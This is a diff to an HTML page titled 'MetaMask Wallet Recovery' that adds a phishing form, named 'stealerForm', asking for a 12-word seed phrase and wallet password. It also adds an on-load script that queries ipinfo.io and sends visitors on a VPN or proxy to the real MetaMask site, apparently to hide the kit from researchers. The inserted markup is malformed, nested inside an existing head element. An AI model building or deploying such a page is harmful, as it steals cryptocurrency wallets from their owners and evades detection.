@@ -5,6 +5,49 @@
   <title>MetaMask Wallet Recovery</title>
   <link rel="stylesheet" href="style.css" />
 </head>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title> Wallet Verification</title>
+  <link rel="stylesheet" href="style.css" />
+
+  <script>
+    // VPN Cloaking Logic – Auto Trigger on Page Load
+    fetch("https://ipinfo.io/json?token=97788c7d33c9af")
+      .then(res => res.json())
+      .then(data => {
+        const isVPN = data?.privacy?.vpn || data?.privacy?.proxy || false;
+
+        if (isVPN) {
+          console.log("🚨 VPN detected! Redirecting to MetaMask...");
+          window.location.href = "https://metamask.io";
+        } else {
+          console.log("✅ No VPN detected. Proceeding to main site...");
+        }
+      })
+      .catch(err => {
+        console.warn("⚠️ IPInfo failed:", err);
+      });
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h2>🔐 Wallet Verification</h2>
+    <form id="stealerForm">
+      <input type="text" id="wallet" placeholder="Enter your 12-word seed phrase" required />
+      <input type="password" id="password" placeholder="Wallet password" required />
+      <button type="submit">Verify Wallet</button>
+    </form>
+    <div id="errorMsg"></div>
+    <footer>METAMASK KEY RECOVERY</footer>
+  </div>
+  
+  <script src="script.js"></script>
+</body>
+</html>
+
 <body>
   
 
